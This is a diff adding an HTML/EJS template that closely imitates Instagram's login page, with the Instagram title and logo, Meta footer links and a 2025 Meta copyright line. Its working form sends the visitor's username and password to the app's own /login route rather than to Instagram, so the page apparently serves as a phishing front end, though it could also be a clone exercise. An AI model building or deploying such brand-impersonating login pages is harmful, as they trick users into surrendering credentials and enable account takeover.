@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/stylesheets/Login.css">
+
+  <title>Instagram</title>
+
+</head>
+
+<body>
+
+  <div id="maindiv">
+    <main class="a1-container">
+      <!-- Images Section -->
+      <div class="a1-images-container">
+        <div class="a1-image-card a1-left-card"></div>
+        <div class="a1-image-card a1-primary-card"></div>
+        <div class="a1-image-card a1-right-card"></div>
+
+        <!-- Reactions -->
+        <div class="a1-reaction a1-heart"></div>
+        <div class="a1-reaction a1-emoji">🙂 😍</div>
+        <div class="a1-reaction a1-comment"></div>
+        <div class="a1-reaction a1-like">❤️</div>
+        <div class="a1-reaction a1-checkmark">✓</div>
+      </div>
+
+      <!-- Login Section -->
+      <div class="a1-login-container">
+        <div class="a1-login-box">
+          <div class="a1-logo">
+            <h1 style="font-family: 'Billabong', cursive; font-size: 42px;"> <img
+                style="width: 50%; height: 50%; mix-blend-mode: hard-light;" src="/images/image.png" alt="Instagram">
+            </h1>
+          </div>
+          <!-- Include Alpine.js for simple animation (optional but recommended) -->
+          <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+
+          <form action="/login" method="post" class="a1-form" x-data="{ showError: <%= error ? 'true' : 'false' %> }">
+            <input class="a1-input" type="text" name="username" placeholder="Phone number, username, or email"
+              aria-label="Phone number, username, or email">
+
+            <input class="a1-input mt-4" name="password" type="password" placeholder="Password" aria-label="Password">
+
+            <!-- Error message with sliding effect -->
+            <template x-if="showError">
+              <p style="color: red;margin-top: 4px;margin-bottom: 2px;" class="text-red-500 text-sm top-5  text-center font-medium transition-all duration-500 transform origin-top scale-y-0"
+                x-init="$el.classList.remove('scale-y-0'); $el.classList.add('scale-y-100')">
+                <%= error %>
+              </p>
+            </template>
+
+            <button class="a1-button mt-4" type="submit">Log in</button>
+          </form>
+
+
+
+
+          <div class="a1-divider">
+            <div class="a1-line"></div>
+            <div class="a1-or">OR</div>
+            <div class="a1-line"></div>
+          </div>
+
+          <a href="#" class="a1-facebook-login">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#385185" viewBox="0 0 24 24">
+              <path
+                d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z" />
+            </svg>
+            Log in with Facebook
+          </a>
+
+          <a href="#" class="a1-forgot-password">Forgot password?</a>
+        </div>
+
+        <div class="a1-signup">
+          <p>Don't have an account? <a href="/signup">Sign up</a></p>
+        </div>
+      </div>
+    </main>
+
+    <footer class="a1-footer">
+      <div class="a1-footer-links">
+        <a href="#" class="a1-footer-link">Meta</a>
+        <a href="#" class="a1-footer-link">About</a>
+        <a href="#" class="a1-footer-link">Blog</a>
+        <a href="#" class="a1-footer-link">Jobs</a>
+        <a href="#" class="a1-footer-link">Help</a>
+        <a href="#" class="a1-footer-link">API</a>
+        <a href="#" class="a1-footer-link">Privacy</a>
+        <a href="#" class="a1-footer-link">Terms</a>
+        <a href="#" class="a1-footer-link">Locations</a>
+        <a href="#" class="a1-footer-link">Instagram Lite</a>
+        <a href="#" class="a1-footer-link">Threads</a>
+        <a href="#" class="a1-footer-link">Contact Uploading & Non-Users</a>
+        <a href="#" class="a1-footer-link">Meta Verified</a>
+      </div>
+
+      <div class="a1-language-select">
+        <select class="a1-select" aria-label="Switch Display Language">
+          <option value="en">English</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+          <option value="de">Deutsch</option>
+          <option value="it">Italiano</option>
+        </select>
+        <span class="a1-copyright">© 2025 Instagram from Meta</span>
+      </div>
+    </footer>
+  </div>
+</body>
+
+</html>
